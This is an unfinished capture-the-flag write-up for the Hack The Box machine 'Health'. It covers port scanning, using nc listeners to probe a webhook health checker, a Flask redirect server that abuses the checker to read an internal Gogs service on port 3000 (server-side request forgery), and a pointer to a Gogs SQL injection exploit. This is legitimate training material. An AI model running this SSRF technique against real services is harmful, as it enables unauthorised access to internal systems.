# Health (WIP)

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 13:13 EDT
Nmap scan report for 10.129.71.152
Host is up (0.029s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```

### Webhook

The web application performs 'health checks' for any URL:

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

For enumeration, I started 2 `nc` listeners, one on port 5555 and the other on port 4444. Then, we can create a webhook like so:

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

When we click test, port 4444 gets a request first.&#x20;

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.71.152] 56126
GET / HTTP/1.0
Host: 10.10.14.13:4444
Connection: close
```

When we close port 4444, port 5555 gets a request as well:

{% code overflow="wrap" %}
```
$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.71.152] 58134
POST / HTTP/1.1
Host: 10.10.14.13:5555
Accept: */*
Content-type: application/json
Content-Length: 101

{"webhookUrl":"http:\/\/10.10.14.13:5555","monitoredUrl":"http:\/\/10.10.14.13:4444","health":"down"}
```
{% endcode %}

So the monitored URl is the one that is being checked, and it reports back to port 5555 about the health of the monitored URL. Interestingly, when we try to use `health.htb` as the monitored URL, there's an error saying that we cannot use that host:

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Redirect Steal Page

This box was really similar to another box Forge, where we can set up a Python script to redirect applications to make the application visit us and be redirected to another place. The `nmap` scan picked up on port 3000 being filtered earlier, so let's try to view the page contents.

We can create a similar script using Flask and Python:

```python
from flask import Flask,redirect,request

app = Flask(__name__)

@app.route('/redir',methods=["GET"])
def hello():
    return redirect("http://127.0.0.1:3000/")

@app.route("/hook",methods=["POST"])
def hook():
    print(request.json)
    return("", 200)

if __name__ == '__main__':
    app.run(debug=True,host='10.10.14.13', port=80)
```

Using this, we can start the server and create a webhook to always run.

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

In the next minute, it would visit our `/redir` endpoint and be redirected to port 3000, which would be healthy, and then return the information to `/hook`. This only works because the application returns the entire page when the health is 'up'.&#x20;

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Gogs SQL Injection

Within the output here, we can find the version used:

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

There is one SQL Injection exploit for this:

{% embed url="https://www.exploit-db.com/exploits/35238" %}

